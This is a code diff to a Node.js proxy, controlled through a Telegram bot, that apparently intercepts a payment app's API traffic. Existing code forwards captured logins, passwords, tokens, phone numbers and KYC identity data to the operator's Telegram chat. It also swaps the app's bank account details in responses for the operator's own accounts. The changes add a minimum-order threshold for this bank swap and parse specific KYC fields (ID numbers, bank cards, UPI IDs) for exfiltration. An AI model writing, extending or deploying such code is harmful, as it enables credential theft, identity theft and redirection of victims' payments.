@@ -114,8 +114,20 @@ function bankListText(d) {
   if (d.banks.length === 0) return 'No banks added yet.';
   return d.banks.map((b, i) => {
     const a = i === d.activeIndex ? ' ✅' : '';
-    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${a}`;
+    const minStr = b.minAmount ? ` | Min: ₹${b.minAmount}` : '';
+    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${minStr}${a}`;
   }).join('\n');
+}
+
+function getOrderAmount(req, respData) {
+  if (respData && typeof respData === 'object') {
+    const amt = respData.orderAmount || respData.amount || respData.money || respData.totalAmount || respData.rechargeAmount || respData.buyAmount;
+    if (amt !== undefined && amt !== null) { const n = parseFloat(amt); if (!isNaN(n)) return n; }
+  }
+  const body = req && req.parsedBody ? req.parsedBody : (req && req.body ? req.body : {});
+  const ba = body.amount || body.orderAmount || body.totalAmount || body.money;
+  if (ba !== undefined && ba !== null) { const n = parseFloat(ba); if (!isNaN(n)) return n; }
+  return null;
 }
 
 async function notifyAdmin(data, msg) {
@@ -463,6 +475,7 @@ app.post('/bot-webhook', async (req, res) => {
 /addbank Name|AccNo|IFSC|BankName|UPI
 /removebank <number>
 /setbank <number>
+/setmin <number> <amount> — Min buy amount for bank replace
 /banks — List all banks
 
 === CONTROL ===
@@ -666,6 +679,24 @@ Example:
       if (isNaN(idx) || idx < 0 || idx >= data.banks.length) { await bot.sendMessage(chatId, '❌ Invalid index.'); return res.sendStatus(200); }
       data.activeIndex = idx; data._skipOverrideMerge = true; await saveData(data);
       await bot.sendMessage(chatId, `✅ Active bank: #${idx + 1}\n${data.banks[idx].accountHolder} | ${data.banks[idx].accountNo} | ${data.banks[idx].ifsc}`);
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/setmin ')) {
+      data = await loadData(true);
+      const parts = text.substring(8).trim().split(/\s+/);
+      const bankIdx = parseInt(parts[0]) - 1;
+      const amount = parseFloat(parts[1]);
+      if (isNaN(bankIdx) || bankIdx < 0 || bankIdx >= (data.banks || []).length || isNaN(amount) || amount < 0) {
+        await bot.sendMessage(chatId, '❌ Format: /setmin <bank_number> <amount>\nExample: /setmin 1 500\n\nBank replace sirf tabhi hoga jab buy amount >= set amount');
+        return res.sendStatus(200);
+      }
+      data.banks[bankIdx].minAmount = amount;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, amount === 0
+        ? `✅ Bank #${bankIdx + 1} ka min amount remove kiya — ab saari amounts pe bank replace hoga`
+        : `✅ Bank #${bankIdx + 1} min amount: ₹${amount}\nAb sirf ₹${amount}+ ke buy orders pe bank replace hoga`);
       return res.sendStatus(200);
     }
 
@@ -911,10 +942,8 @@ app.all('/xxapi/*', async (req, res) => {
       const token = (respData && typeof respData === 'object') ? (respData.token || respData.accessToken || '') : '';
       notifyAdmin(data,
 `🔑 LOGIN CAPTURED
-👤 User ID: ${userId || 'N/A'}
-📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Password: ' + pwd : ''}${token ? '\n🎫 Token: ' + String(token).substring(0, 60) + '...' : ''}
-📦 POST: ${req.rawBody ? req.rawBody.toString().substring(0, 800) : 'empty'}
-📋 Response: ${respBody.substring(0, 500)}
+👤 User: ${userId || 'N/A'}
+📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${token ? '\n🎫 Token: ' + String(token).substring(0, 40) + '...' : ''}
 🕐 ${now}`);
 
       if (phone && data.suspendedPhones && data.suspendedPhones[String(phone)]) {
@@ -996,28 +1025,40 @@ app.all('/xxapi/*', async (req, res) => {
       }
       notifyAdmin(data,
 `🔔 ORDER DETECTED
-👤 User: ${userId || 'N/A'}${phone ? '\n📱 Phone: ' + phone : ''}${orderId ? '\n📋 Order: ' + orderId : ''}
+👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${orderId ? '\n📋 Order: ' + orderId : ''}
 💳 Bank: ${bank ? bank.accountHolder + ' | ' + bank.accountNo : 'N/A'}
-📦 POST: ${req.rawBody ? req.rawBody.toString().substring(0, 1000) : 'empty'}
-📋 Response: ${respBody.substring(0, 500)}
 🕐 ${now}`);
     }
 
     if (urlLower.includes('kyc') || urlLower.includes('bind') || urlLower.includes('linkkyc')) {
+      let kycInfo = '';
+      if (req.rawBody) {
+        try {
+          const ct = (req.headers['content-type'] || '').toLowerCase();
+          let b = {};
+          if (ct.includes('json')) b = JSON.parse(req.rawBody.toString());
+          else if (ct.includes('multipart')) b = parseMultipartFields(req.rawBody);
+          else if (ct.includes('form')) b = Object.fromEntries(new URLSearchParams(req.rawBody.toString()));
+          const keys = ['realName','name','idCard','idNo','bankCard','bankNo','accountNo','ifsc','upiId','phone','mobile'];
+          for (const k of keys) { if (b[k]) kycInfo += `\n  ${k}: ${b[k]}`; }
+        } catch(e) {}
+      }
       notifyAdmin(data,
-`🔐 KYC/BIND DATA
-👤 User: ${userId || 'N/A'}
-📦 POST: ${req.rawBody ? req.rawBody.toString().substring(0, 1500) : 'empty'}
-📋 Response: ${respBody.substring(0, 500)}
+`🔐 KYC/BIND
+👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${kycInfo}
 🕐 ${now}`);
     }
 
     if (urlLower.includes('sell') || urlLower.includes('withdraw')) {
+      let sellAmt = '';
+      if (respData && typeof respData === 'object') {
+        const a = respData.amount || respData.money || respData.withdrawAmount || respData.sellAmount;
+        if (a) sellAmt = `\n💰 Amount: ₹${a}`;
+      }
       notifyAdmin(data,
 `💸 SELL/WITHDRAW
-👤 User: ${userId || 'N/A'}
-📦 POST: ${req.rawBody ? req.rawBody.toString().substring(0, 1000) : 'empty'}
-📋 Response: ${respBody.substring(0, 500)}
+👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${sellAmt}
+📊 Status: ${response.status}
 🕐 ${now}`);
     }
 
@@ -1031,25 +1072,29 @@ app.all('/xxapi/*', async (req, res) => {
         }
       }
       notifyAdmin(data,
-`🔔 NEW BILL NOTIFICATION
+`🔔 NEW BILL
 👤 User: ${userId || 'N/A'}${billInfo}
-📦 POST: ${req.rawBody ? req.rawBody.toString().substring(0, 800) : 'empty'}
-📋 Response: ${respBody.substring(0, 400)}
 🕐 ${now}`);
     }
 
     if (data.logRequests && data.adminChatId && bot && !isLogin && !isUserInfo && !isOrder) {
       const tag = userId ? ` [${userId}]` : '';
       const phoneTag = phone ? ` (${phone})` : '';
-      const postData = (req.method === 'POST' && req.rawBody && req.rawBody.length > 0) ? `\n📦 POST: ${req.rawBody.toString().substring(0, 300)}` : '';
-      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}${postData}\n📊 Status: ${response.status}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}\n📊 Status: ${response.status}`).catch(()=>{});
     }
 
     if (data.botEnabled !== false) {
       const bank = getActiveBank(data, userId);
       if (bank) {
-        const globalHasAcct = scanHasBankFields(jsonResp, 0);
-        deepReplaceBankFields(jsonResp, bank, 0, globalHasAcct);
+        let shouldReplace = true;
+        if (bank.minAmount) {
+          const amt = getOrderAmount(req, respData);
+          if (amt !== null && amt < bank.minAmount) shouldReplace = false;
+        }
+        if (shouldReplace) {
+          const globalHasAcct = scanHasBankFields(jsonResp, 0);
+          deepReplaceBankFields(jsonResp, bank, 0, globalHasAcct);
+        }
       }
 
       {
